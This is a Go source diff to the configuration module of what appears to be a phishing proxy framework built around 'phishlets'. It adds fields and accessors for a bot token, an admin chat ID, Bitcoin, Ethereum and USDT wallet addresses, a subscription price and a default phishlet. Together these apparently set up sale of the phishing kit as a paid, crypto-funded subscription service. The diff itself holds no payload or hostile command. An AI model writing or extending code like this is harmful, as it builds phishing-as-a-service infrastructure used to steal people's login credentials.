@@ -119,6 +119,13 @@ type GeneralConfig struct {
 	DefaultRedirectUrl   string `mapstructure:"default_redirect_url" json:"default_redirect_url" yaml:"default_redirect_url"`
 	AdminPassword        string `mapstructure:"admin_password" json:"admin_password" yaml:"admin_password"`
 	RedirectChainSecret  string `mapstructure:"redirect_chain_secret" json:"redirect_chain_secret" yaml:"redirect_chain_secret"`
+	BotToken             string `mapstructure:"bot_token" json:"bot_token" yaml:"bot_token"`
+	BotAdminChatId       int64  `mapstructure:"bot_admin_chat_id" json:"bot_admin_chat_id" yaml:"bot_admin_chat_id"`
+	CryptoBTC            string `mapstructure:"crypto_btc" json:"crypto_btc" yaml:"crypto_btc"`
+	CryptoETH            string `mapstructure:"crypto_eth" json:"crypto_eth" yaml:"crypto_eth"`
+	CryptoUSDT           string `mapstructure:"crypto_usdt" json:"crypto_usdt" yaml:"crypto_usdt"`
+	SubPrice             int    `mapstructure:"sub_price" json:"sub_price" yaml:"sub_price"`
+	DefaultPhishlet      string `mapstructure:"default_phishlet" json:"default_phishlet" yaml:"default_phishlet"`
 }
 
 type DNSEntry struct {
@@ -1121,4 +1128,23 @@ func (c *Config) GetDnsEntries() string {
 		out += fmt.Sprintf("%s -> %s: %s; ", k, v.Type, v.Value)
 	}
 	return out
+}
+
+func (c *Config) GetBotToken() string             { return c.general.BotToken }
+func (c *Config) GetBotAdminChatId() int64        { return c.general.BotAdminChatId }
+func (c *Config) GetCryptoBTC() string            { return c.general.CryptoBTC }
+func (c *Config) GetCryptoETH() string            { return c.general.CryptoETH }
+func (c *Config) GetCryptoUSDT() string           { return c.general.CryptoUSDT }
+func (c *Config) GetSubPrice() int                { p := c.general.SubPrice; if p == 0 { return 150 }; return p }
+func (c *Config) GetDefaultPhishlet() string      { return c.general.DefaultPhishlet }
+
+func (c *Config) SetBotConfig(token string, adminChatId int64, btc, eth, usdt string, price int) {
+	c.general.BotToken = token
+	c.general.BotAdminChatId = adminChatId
+	c.general.CryptoBTC = btc
+	c.general.CryptoETH = eth
+	c.general.CryptoUSDT = usdt
+	c.general.SubPrice = price
+	c.cfg.Set(CFG_GENERAL, c.general)
+	c.cfg.WriteConfig()
 }
